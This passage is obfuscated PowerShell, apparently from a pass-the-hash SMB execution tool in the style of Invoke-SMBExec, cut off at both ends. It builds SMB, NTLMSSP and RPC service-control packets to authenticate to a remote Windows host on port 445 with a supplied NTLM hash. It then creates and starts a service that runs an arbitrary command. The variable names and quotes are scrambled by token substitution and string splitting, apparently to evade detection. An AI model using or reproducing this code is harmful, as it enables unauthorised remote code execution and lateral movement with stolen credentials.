    wB69NTLMSSPNegotiate.Add(NDckMechTokenIDNDck,[Byte[]](0xa2))

    wB69NTLMSSPNegotiate.Add(NDckMechTokenLengthNDck,wB69ASN_length_4)

    wB69NTLMSSPNegotiate.Add(NDckNTLMSSPIDNDck,[Byte[]](0x04))

    wB69NTLMSSPNegotiate.Add(NDckNTLMSSPLengthNDck,wB69NTLMSSP_length)

    wB69NTLMSSPNegotiate.Add(NDckIdentifierNDck,[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))

    wB69NTLMSSPNegotiate.Add(NDckMessageTypeNDck,[Byte[]](0x01,0x00,0x00,0x00))

    wB69NTLMSSPNegotiate.Add(NDckNegotiateFlagsNDck,wB69NegotiateFlags)

    wB69NTLMSSPNegotiate.Add(NDckCallingWorkstationDomainNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    wB69NTLMSSPNegotiate.Add(NDckCallingWorkstationNameNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))


    if(wB69Version)

    {

        wB69NTLMSSPNegotiate.Add(NDckVersionNDck,wB69Version)

    }


    return wB69NTLMSSPNegotiate

}


function New-PacketNTLMSSPAuth

{

    param([Byte[]]wB69NTLMResponse)


    [Byte[]]wB69NTLMSSP_length = ([System.BitConverter]::GetBytes(wB69NTLMResponse.Length))[1,0]

    [Byte[]]wB69ASN_length_1 = ([System.BitConverter]::GetBytes(wB69NTLMResponse.Length + 12))[1,0]

    [Byte[]]wB69ASN_length_2 = ([System.BitConverter]::GetBytes(wB69NTLMResponse.Length + 8))[1,0]

    [Byte[]]wB69ASN_length_3 = ([System.BitConverter]::GetBytes(wB69NTLMResponse.Length + 4))[1,0]


    wB69NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary

    wB69NTLMSSPAuth.Add(NDckASNIDNDck,[Byte[]](0xa1,0x82))

    wB69NTLMSSPAuth.Add(NDckASNLengthNDck,wB69ASN_length_1)

    wB69NTLMSSPAuth.Add(NDckASNID2NDck,[Byte[]](0x30,0x82))

    wB69NTLMSSPAuth.Add(NDckASNLength2NDck,wB69ASN_length_2)

    wB69NTLMSSPAuth.Add(NDckASNID3NDck,[Byte[]](0xa2,0x82))

    wB69NTLMSSPAuth.Add(NDckASNLength3NDck,wB69ASN_length_3)

    wB69NTLMSSPAuth.Add(NDckNTLMSSPIDNDck,[Byte[]](0x04,0x82))

    wB69NTLMSSPAuth.Add(NDckNTLMSSPLengthNDck,wB69NTLMSSP_length)

    wB69NTLMSSPAuth.Add(NDckNTLMResponseNDck,wB69NTLMResponse)


    return wB69NTLMSSPAuth

}


#RPC


function New-PacketRPCBind

{

    param([Byte[]]wB69FragLength,[Int]wB69CallID,[Byte[]]wB69NumCtxItems,[Byte[]]wB69Con'+'textID,[Byte[]]wB69UUID,[Byte[]]wB69UUIDVersion)


    [Byte[]]wB69call_ID = [System.BitConverter]::GetBytes(wB69CallID)


    wB69RPCBind = New-Object System.Collections.Specialized.OrderedDictionary

    wB69RPCBind.Add(NDckVersionNDck,[Byte[]](0x05))

    wB69RPCBind.Add(NDckVersionMinorNDck,[Byte[]](0x00))

    wB69RPCBind.Add(NDckPacketTypeNDck,[Byte[]](0x0b))

    wB69RPCBind.Add(NDckPacketFlagsNDck,[Byte[]](0x03))

    wB69RPCBind.Add(NDckDataRepresentationNDck,[Byte[]](0x10,0x00,0x00,0x00))

    wB69RPCBind.Add(NDckFragLengthNDck,wB69FragLength)

    wB69RPCBind.Add(NDckAuthLengthNDck,[Byte[]](0x00,0x00))

    wB69RPCBind.Add(NDckCallIDNDck,wB69call_ID)

    wB69RPCBind.Add(NDckMaxXmitFragNDck,[Byte[]](0xb8,0x10))

    wB69RPCBind.Add(NDckMaxRecvFragNDck,[Byte[]](0xb8,0x10))

    wB69RPCBind.Add(NDckAssocGroupNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69RPCBind.Add(NDckNumCtxItemsNDck,wB69NumCtxItems)

    wB69RPCBind.Add(NDckUnknownNDck,[Byte[]](0x00,0x00,0x00))

    wB69RPCBind.Add(NDckContextIDNDck,wB69ContextID)

    wB69RPCBind.Add(NDckNumTransItemsNDck,[Byte[]](0x01))

    wB69RPCBind.Add(NDckUnknown2NDck,[Byte[]](0x00))

    wB69RPCBind.Add(NDckInterfaceNDck,wB69UUID)

    wB69RPCBind.Add(NDckInterfaceVerNDck,wB69UUIDVersion)

    wB69RPCBind.Add(NDckInterfaceVerMinorNDck,[Byte[]](0x00,0x00))

    wB69RPCBind.Add(NDckTransferSyntaxNDck,[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))

    wB69RPCBind.Add(NDckTransferSyntaxVerNDck,[Byte[]](0x02,0x00,0x00,0x00))


    if(wB69NumCtxItems[0] -eq 2)

    {

        wB69RPCBind.Add(NDckContextID2NDck,[Byte[]](0x01,0x00))

        wB69RPCBind.Add(NDckNumTransItems2NDck,[Byte[]](0x01))

        wB69RPCBind.Add(NDckUnknown3NDck,[Byte[]](0x00))

        wB69RPCBind.Add(NDckInterface2NDck,wB69UUID)

        wB69RPCBind.Add(NDckInterfaceVer2NDck,wB69UUIDVersion)

        wB69RPCBind.Add(NDckInterfaceVerMinor2NDck,[Byte[]](0x00,0x00))

        wB69RPCBind.Add(NDckTransferSyntax2NDck,[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        wB69RPCBind.Add(NDckTransferSyntaxVer2NDck,[Byte[]](0x01,0x00,0x00,0x00))

    }

    elseif(wB69NumCtxItems[0] -eq 3)

    {

        wB69RPCBind.Add(NDckContextID2NDck,[Byte[]](0x01,0x00))

        wB69RPCBind.Add(NDckNumTransItems2NDck,[Byte[]](0x01))

        wB69RPCBind.Add(NDckUnknown3NDck,[Byte[]](0x00))

        wB69RPCBind.Add(NDckInterface2NDck,wB69UUID)

        wB69RPCBind.Add(NDckInterfaceVer2NDck,wB69UUIDVersion)

        wB69RPCBind.Add(NDckInterfaceVerMinor2NDck,[Byte[]](0x00,0x00))

        wB69RPCBind.Add(NDckTransferSyntax2NDck,[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))

        wB69RPCBind.Add(NDckTransferSyntaxVer2NDck,[Byte[]](0x01,0x00,0x00,0x00))

        wB69RPCBind.Add(NDckContextID3NDck,[Byte[]](0x02,0x00))

        wB69RPCBind.Add(NDckNumTransItems3NDck,[Byte[]](0x01))

        wB69RPCBind.Add(NDckUnknown4NDck,[Byte[]](0x00))

        wB69RPCBind.Add(NDckInterface3NDck,wB69UUID)

        wB69RPCBind.Add(NDckInterfaceVer3NDck,wB69UUIDVersion)

        wB69RPCBind.Add(NDckInterfaceVerMinor3NDck,[Byte[]](0x00,0x00))

        wB69RPCBind.Add(NDckTransferSyntax3NDck,[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        wB69RPCBind.Add(NDckTransferSyntaxVer3NDck,[Byte[]](0x01,0x00,0x00,0x00))

    }


    if(wB69call_ID -eq 3)

    {

        wB69RPCBind.Add(NDckAuthTypeNDck,[Byte[]](0x0a))

        wB69RPCBind.Add(NDckAuthLevelNDck,[Byte[]](0x02))

        wB69RPCBind.Add(NDckAuthPadLengthNDck,[Byte[]](0x00))

        wB69RPCBind.Add(NDckAuthReservedNDck,[Byte[]](0x00))

        wB69RPCBind.Add(NDckContextID3NDck,[Byte[]](0x00,0x00,0x00,0x00))

        wB69RPCBind.Add(NDckIdentifierNDck,[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))

        wB69RPCBind.Add(NDckMessageTypeNDck,[Byte[]](0x01,0x00,0x00,0x00))

        wB69RPCBind.Add(NDckNegotiateFlagsNDck,[Byte[]](0x97,0x82,0x08,0xe2))

        wB69RPCBind.Add(NDckCallingWorkstationDomainNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        wB69RPCBind.Add(NDckCallingWorkstationNameNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        wB69RPCBind.Add(NDckOSVersionNDck,[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))

    }


    return wB69RPCBind

}


function New-PacketRPCRequest

{

    param([Byte[]]wB69Flags,[Int]wB69ServiceLength,[Int]wB69AuthLength,[Int]wB69AuthPadding,[Byte[]]wB69CallID,[Byte[]]wB69ContextID,[Byte[]]wB69Opnum,[Byte[]]wB69Data)


    if(wB69AuthLength -gt 0)

    {

        wB69full_auth_length = wB69AuthLength + wB69AuthPadding + 8

    }


    [Byte[]]wB69write_length = [System.BitConverter]::GetBytes(wB69ServiceLength + 24 + wB69full_auth_length + wB69Data.Length)

    [Byte[]]wB69frag_length = wB69write_length[0,1]

    [Byte[]]wB69alloc_hint = [System.BitConverter]::GetByt'+'es(wB69ServiceLength + wB69Data.Length)

    [Byte[]]wB69auth_length = ([System.BitConverter]::GetBytes(wB69AuthLength))[0,1]


    wB69RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary

    wB69RPCRequest.Add(NDckVersionNDck,[Byte[]](0x05))

    wB69RPCRequest.Add(NDckVersionMinorNDck,[Byte[]](0x00))

    wB69RPCRequest.Add(NDckPacketTypeNDck,[Byte[]](0x00))

    wB69RPCRequest.Add(NDckPacketFlagsNDck,wB69Flags)

    wB69RPCRequest.Add(NDckDataRepresentationNDck,[Byte[]](0x10,0x00,0x00,0x00))

    wB69RPCRequest.Add(NDckFragLengthNDck,wB69frag_length)

    wB69RPCRequest.Add(NDckAuthLengthNDck,wB69auth_length)

    wB69RPCRequest.Add(NDckCallIDNDck,wB69CallID)

    wB69RPCRequest.Add(NDckAllocHintNDck,wB69alloc_hint)

    wB69RPCRequest.Add(NDckContextIDNDck,wB69ContextID)

    wB69RPCRequest.Add(NDckOpnumNDck,wB69Opnum)


    if(wB69data.Length)

    {

        wB69RPCRequest.Add(NDckDataNDck,wB69Data)

    }


    return wB69RPCRequest

}


#SCM


function New-PacketSCMOpenSCManagerW

{

    param ([Byte[]]wB69packet_service,[Byte[]]wB69packet_service_length)


    wB69packet_referent_ID1 = [String](1..2 uOva ForEach-Object {NDck{0:X2}NDck -f (Get-Random -Minimum 1 -Maximum 255)})

    wB69packet_referent_ID1 = wB69packet_referent_ID1.Split(NDck NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}

    wB69packet_referent_ID1 += 0x00,0x00

    wB69packet_referent_ID2 = [String](1..2 uOva ForEach-Object {NDck{0:X2}NDck -f (Get-Random -Minimum 1 -Maximum 255)})

    wB69packet_referent_ID2 = wB69packet_referent_ID2.Split(NDck NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}

    wB69packet_referent_ID2 += 0x00,0x00


    wB69packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary

    wB69packet_SCMOpenSCManagerW.Add(NDckMachineName_ReferentIDNDck,wB69packet_referent_ID1)

    wB69packet_SCMOpenSCManagerW.Add(NDckMachineName_MaxCountNDck,wB69packet_service_length)

    wB69packet_SCMOpenSCManagerW.Add(NDckMachineName_OffsetNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69packet_SCMOpenSCManagerW.Add(NDckMachineName_ActualCountNDck,wB69packet_service_length)

    wB69packet_SCMOpenSCManagerW.Add(NDckMachineNameNDck,wB69packet_service)

    wB69packet_SCMOpenSCManagerW.Add(NDckDatabase_ReferentIDNDck,wB69packet_referent_ID2)

    wB69packet_SCMOpenSCManagerW.Add(NDckDatabase_NameMaxCountNDck,[Byte[]](0x0f,0x00,0x00,0x00))

    wB69packet_SCMOpenSCManagerW.Add(NDckDatabase_NameOffsetNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69packet_SCMOpenSCManagerW.Add(NDckDatabase_NameActualCountNDck,[Byte[]](0x0f,0x00,0x00,0x00))

    wB69packet_SCMOpenSCManagerW.Add(NDckDatabaseNDck,[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))

    wB69packet_SCMOpenSCManagerW.Add(NDckUnknownNDck,[Byte[]](0xbf,0xbf))

    wB69packet_SCMOpenSCManagerW.Add(NDckAccessMaskNDck,[Byte[]](0x3f,0x00,0x00,0x00))

    

    return wB69packet_SCMOpenSCManagerW

}


function New-PacketSCMCreateServiceW

{

    param([Byte[]]wB69ContextHandle,[Byte[]]wB69Service,[Byte[]]wB69ServiceLength,[Byte[]]wB69Command,[Byte[]]wB69CommandLength)

                

    wB69referent_ID = [String](1..2 uOva ForEach-Object {NDck{0:X2}NDck -f (Get-Random -Minimum 1 -Maximum 255)})

    wB69refe'+'rent_ID = wB69referent_ID'+'.Split(NDck NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}

    wB69referent_ID += 0x00,0x00


    wB69SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SCMCreateServiceW.Add(NDckContextHandleNDck,wB69ContextHandle)

    wB69SCMCreateServiceW.Add(NDckServiceName_MaxCountNDck,wB69ServiceLength)

    wB69SCMCreateServiceW.Add(NDckServiceName_OffsetNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SCMCreateServiceW.Add(NDckServiceName_ActualCountNDck,wB69ServiceLength)

    wB69SCMCreateServiceW.Add(NDckServiceNameNDck,wB69Service)

    wB69SCMCreateServiceW.Add(NDckDisplayName_ReferentIDNDck,wB69referent_ID)

    wB69SCMCreateServiceW.Add(NDckDisplayName_MaxCountNDck,wB69ServiceLength)

    wB69SCMCreateServiceW.Add(NDckDisplayName_OffsetNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SCMCreateServiceW.Add(NDckDisplayName_ActualCountNDck,wB69ServiceLength)

    wB69SCMCreateServiceW.Add(NDckDisplayNameNDck,wB69Service)

    wB69SCMCreateServiceW.Add(NDckAccessMaskNDck,[Byte[]](0xff,0x01,0x0f,0x00))

    wB69SCMCreateServiceW.Add(NDckServiceTypeNDck,[Byte[]](0x10,0x00,0x00,0x00))

    wB69SCMCreateServiceW.Add(NDckServiceStartTypeNDck,[Byte[]](0x03,0x00,0x00,0x00))

    wB69SCMCreateServiceW.Add(NDckServiceErrorControlNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SCMCreateServiceW.Add(NDckBinaryPathName_MaxCountNDck,wB69CommandLength)

    wB69SCMCreateServiceW.Add(NDckBinaryPathName_OffsetNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SCMCreateServiceW.Add(NDckBinaryPathName_ActualCountNDck,wB69CommandLength)

    wB69SCMCreateServiceW.Add(NDckBinaryPathNameNDck,wB69Command)

    wB69SCMCreateServiceW.Add(NDckNULLPointerNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SCMCreateServiceW.Add(NDckTagIDNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SCMCreateServiceW.Add(NDckNULLPointer2NDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SCMCreateServiceW.Add(NDckDependSizeNDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SCMCreateServiceW.Add(NDckNULLPointer3NDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SCMCreateServiceW.Add(NDckNULLPointer4NDck,[Byte[]](0x00,0x00,0x00,0x00))

    wB69SCMCreateServiceW.Add(NDckPasswordSizeNDck,[Byte[]](0x00,0x00,0x00,0x00))


    return wB69SCMCreateServiceW

}


function New-PacketSCMStartServiceW

{

    param([Byte[]]wB69ContextHandle)


    wB69SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SCMStartServiceW.Add(NDckContextHandleNDck,wB69ContextHandle)

    wB69SCMStartServiceW.Add('+'NDckUnknownNDck,[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))


    return wB69SCMStartServiceW

}


function New-PacketSCMDeleteServiceW

{

    param([Byte[]]wB69ContextHandle)


    wB69SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SCMDeleteServiceW.Add(NDckContextHandleNDck,wB69ContextHandle)


    return wB69SCMDeleteServiceW

}


function New-PacketSCMCloseServiceHandle

{

    param([Byte[]]wB69ContextHandle)


    wB69SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary

    wB69SCM_CloseServiceW.Add(NDckContextHandleNDck,wB69ContextHandle)


    return wB69SCM_CloseServiceW

}


function Get-StatusPending

{

    param ([Byte[]]wB69Status)


    if([System.BitConverter]::ToString(wB69Status) -eq utH903-01-00-00utH9)

    {

        wB69status_pending = wB69true

    }


    return wB69status_pending

}


function Get-UInt16DataLength

{

    param ([Int]wB69Start,[Byte[]]wB69Data)


    wB69data_length = [System.BitConverter]::ToUInt16(wB69Data[wB69Start..(wB69Start + 1)],0)


    return wB69data_length

}


if(w'+'B69hash -like NDck*:*NDck)

{

    wB69hash = wB69hash.SubString((wB69hash.IndexOf(NDck:NDck) + 1),32)

}


if(wB69Domain)

{

    wB69output_username = wB69Domain + NDck9e0NDck + wB69Username

}

else

{

    wB69output_username = wB69Username

}


if(wB69PSBoundParameters.ContainsKey(utH9SessionutH9))

{

    wB69inveigh_session = wB69true

}


if(wB69PSBoundParameters.Contain'+'sKey(utH9SessionutH9))'+'

{


    if(!wB69Inveigh)

    {

        Write-Output NDck[-] Inveigh Relay session not foundNDck

        wB69startup_error = wB69true

    }

    elseif(!wB69inveigh.session_socket_table[wB69session].Connected)

    {

        Write-Output NDck[-] Inveigh Relay session not connectedNDck

        wB69startup_error = wB69true

    }


    wB69Target = wB69inveigh.session_socket_table[wB69session].Client.RemoteEndpoint.Address.IPaddressToString

}


wB69process_ID = [System.Diagnostics.Process]::GetCurrentProcess() uOva Select-Object -expand id

wB69process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(wB69process_ID))

[Byte[]]wB69process_ID = wB69process_ID.Split(NDck-NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}


if(!wB69inveigh_session)

{

    wB69client = New-Object System.Net.Sockets.TCPClient

    wB69client.Client.ReceiveTimeout = 60000

}


if(!wB69startup_error -and !wB69inveigh_session)

{


    try

    {

        wB69client.Connect(wB69Target,NDck44'+'5NDck)

    }

    catch

    {

        Write-Output NDck[-] wB69Target did not respondNDck

    }


}


if(wB69client.Connected -or (!wB69startup_error -and wB69inveigh.session_socket_table[wB69session].Connected))

{

    wB69client_receive = New-Object System.Byte[] 1024


    if(!wB69inveigh_session)

    {

        wB69client_stream = wB69client.GetStream()


        if(wB69SMB_version -eq utH9SMB2.1utH9)

        {

            wB69stage = utH9NegotiateSMB2utH9

        }

        else

        {

            wB69stage = utH9NegotiateSMButH9

        }


        while(wB69stage -ne utH9ExitutH9)

        {


            try

            {


                switch (wB69stage)

                {


                    utH9Negotiate'+'SMButH9

                    {

              '+'          wB69packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff wB69process_ID 0x00,0x00

                        wB69packet_SMB_data = New-PacketSMBNegotiateProtocolRequest wB69SMB_version

                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service

                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data


                        try

                        {    

                            wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                            wB69client_stream.Flush()

                            wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                            if([System.BitConverter]::ToString(wB69client_receive[4..7]) -eq utH9ff-53-4d-42utH9)

                            {

                                wB69SMB_version = utH9SMB1utH9

                                wB69stage = utH9NTLMSSPNegotiateutH9


                                if([System.BitConverter]::ToString(wB69client_receive[39]) -eq utH90futH9)

                                {


                                    if(wB69signing_check)

                                    {

                                        Write-Output NDck[+] SMB signing is required on wB69targetNDck

                                        wB69stage = utH9ExitutH9

                                    }

                                    else

                                    {

                                        Write-Verbose NDck[+] SMB signing is requiredNDck

                                        wB69SMB_signing = wB69true

                                        wB69session_key_length = 0x00,0x00

                                        wB69negotiate_flags = 0x15,0x82,0x08,0xa0

                                    }


                                }

                                else

                                {


                                    if(wB69signing_check)

                                    {

                                        Write-Output NDck[+] SMB signing is not required on wB69targetNDck

                                        wB69stage = utH9ExitutH9

                                    }

                                    else

                                    {

                                        wB69SMB_signing = wB69false

                                        wB69session_key_length = 0x00,0x00

                                        wB69negotiate_flags = 0x05,0x82,0x08,0xa0

                                    }


                                }


                            }

                            else

                            {

                                wB69stage = utH9NegotiateSMB2utH9


                                if([System.BitConverter]::ToString(wB69client_receive[70]) -eq utH903utH9)

                                {


                                    if(wB69signing_check)

                                    {

                                        Write-Output NDck[+] SMB signing is required on wB69targetNDck

                                        wB69stage = utH9ExitutH9

                                    }

                                    else

                                    {


                                        if(wB69signing_check)

                                        {

                                            Write-Verbose NDck[+] SMB signing is requiredNDck

                                        }


                                        wB69SMB_signing = wB69true

                                        wB69session_key_length = 0x00,0x00

                                        wB69negotiate_flags = 0x15,0x82,0x08,0xa0

                                    }


                                }

                                else

                                {


                                    if(wB69signing_check)

                                    {

                                        Write-Output NDck[+] SMB signing is not required on wB69targetNDck

                                        wB69stage = utH9ExitutH9

                                    }

                                    else

                                    {

                                        wB69SMB_signing = wB69false

                                        wB69session_key_length = 0x00,0x00

                                        wB69negotiate_flags = 0x05,0x80,0x08,0xa0

                                    }


                                }


                            }


                        }

                        catch

                        {


                            if(wB69_.Exception.Message -like utH9Exception calling NDckReadNDck with NDck3NDck argument(s): NDckUnable to read data from the transport connection: An existing connection was forcibly closed by the remote host.NDckutH9)

                            {

                                Write-Output NDck[-] SMB1 negotiation failedNDck

                                wB69negoitiation_failed = wB69true

                                wB69stage = utH9ExitutH9

                            }


                        }


                    }


                    utH9NegotiateSMB2utH9

                    {


                        if(wB69SMB_version -eq utH9SMB2.1utH9)

                        {

                            wB69message_ID = 0

                        }

                        else

                        {

                            wB69message_ID = 1

                        }


                        wB69tree_ID = 0x00,0x00,0x00,0x00

                        wB69session_ID = 0x00,0x00,0x00,0'+'x00,0x00,0x00,0x00,0x00

                        wB69packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 wB69false wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                        wB69packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest

                        wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                        wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service

                        wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9NTLMSSPNegotiateutH9


                        if([System.BitConverter]::ToString(wB6'+'9client_receive[70]) -eq utH903utH9)

        '+'                {


                            if(wB69signing_check)

                            {

                                Write-Output NDck[+] SMB signing is required on wB69targetNDck

                                wB69stage = utH9ExitutH9

                            }

                            else

                            {


                                if(wB69signing_check)

                                {

                                    Write-Verbose NDck[+] SMB signing is requiredNDck

                                }


                                wB69SMB_signing = wB69true

                                wB69session_key_length = 0x00,0x00

                                wB69negotiate_flags = 0x15,0x82,0x08,0xa0

                            }


                        }

                        else

                        {


                            if(wB69signing_check)

                            {

                                Write-Output NDck[+] SMB signing is not required on wB69targetNDck

                                wB69stage = utH9ExitutH9

                            }

                            else

                            {

                                wB69SMB_signing = wB69false

                                wB69session_key_length ='+' 0x00,0x00

                                wB69negotiate_flags = 0x05,0x80,0x08,0xa0

                            }


                        }


                    }


                    utH9NTLMSSPNegotiateutH9

                    {


                        if(wB69SMB_version -eq utH9SMB1utH9)

                        {

                            wB69packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff wB69process_ID 0x00,0x00


                            if(wB69SMB_signing)

                            {

                                wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            }


                            wB69packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate wB69negotiate_flags

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                            wB69NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary wB69packet_NTLMSSP_negotiate       

                            wB69packet_SMB_data = New-PacketSMBSessionSetupAndXRequest wB69NTLMSSP_negotiate

                            wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                            wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                            wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service

                            wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data

                        }

                        else

                        {

                            wB69message_ID++

                            wB69packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 wB69false wB69message_ID wB69process_ID wB69tree_ID wB69session_ID

                            wB69packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate wB69negotiate_flags

                            wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                            wB69NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary wB69packet_NTLMSSP_negotiate       

                            wB69packet_SMB2_data = New-PacketSMB2SessionSetupRequest wB69NTLMSSP_negotiate

                            wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data

                            wB69pa'+'cket_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

   '+'                         wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service

                            wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data

                        }


                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()    

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9ExitutH9

                    }

                    

                }


            }

            catch

            {

                Write-Output NDck[-] wB69(wB69_.Exception.Message)NDck

                wB69negoitiation_failed = wB69true

            }


        }


        if(!wB69signing_check -and !wB69negoitiation_failed)

        {

            wB69NTLMSSP = [System.BitConverter]::ToString(wB69client_receive)

            wB69NTLMSSP = wB69NTLMSSP -replace NDck-NDck,NDckNDck

            wB69NTLMSSP_index = wB69NTLMSSP.IndexOf(NDck4E544C4D53535000NDck)

            wB69NTLMSSP_bytes_index = wB69NTLMSSP_index / 2

            wB69domain_length = Get-UInt16DataLength (wB69NTLMSSP_bytes_index + 12) wB69client_receive

            wB69target_length = Get-UInt16DataLength (wB69NTLMSSP_bytes_index + 40) wB69client_receive

            wB69session_ID = wB69client_receive[44..51]

            wB69NTLM_challenge = wB69client_receive[(wB69NTLMSSP_bytes_index + 24)..(wB69NTLMSSP_bytes_index + 31)]

            wB69target_details = wB69client_receive[(wB69NTLMSSP_byte'+'s_index + 56 + wB69domain_length)..(wB69NTLMSSP_bytes_index + 55 + wB69domain_length + wB69target_length)]

            wB69target_time_bytes = wB69target_details[(wB69target_details.Length - 12)..(wB69target_details.Length - 5)]

            wB69NTLM_hash_bytes = (&{for (wB69i = 0;wB69i -lt wB69hash.Length;wB69i += 2){wB69hash.SubString(wB69i,2)}}) -join NDck-NDck

            wB69NTLM_hash_bytes = wB69NTLM_hash_bytes.Split(NDck-NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}

            wB69auth_hostname = (Get-ChildItem -path env:computername).Value

            wB69auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes(wB69auth_hostname)

            wB69auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes(wB69Domain)

            wB69auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes('+'wB69username)

            wB69auth_domain_length = [System.BitConverter]::GetBytes(wB69auth_domain_bytes.Length)[0,1]

            wB69auth_domain_length = [System.BitConverter]::GetBytes(wB69auth_domain_bytes.Length)[0,1]

            wB69auth_username_length = [System.BitConverter]::GetBytes(wB69auth_username_bytes.Length)[0,1]

            wB69auth_hostname_length = [System.BitConverter]::GetBytes(wB69auth_hostname_bytes.Length)[0,1]

            wB69auth_domain_offset = 0x40,0x00,0x00,0x00

            wB69auth_username_offset = [System.BitConverter]::GetBytes(wB69auth_domain_bytes.Length + 64)

            wB69auth_hostname_offset = [System.BitConverter]::GetB'+'ytes(wB69auth_domain_bytes.Length + wB69auth_username_bytes.Length + 64)

            wB69auth_LM_offset = [System.BitConverter]::GetBytes(wB69auth_domain_bytes.Length + wB69auth_username_bytes.Length + wB69auth_hostname_bytes.Length + 64)

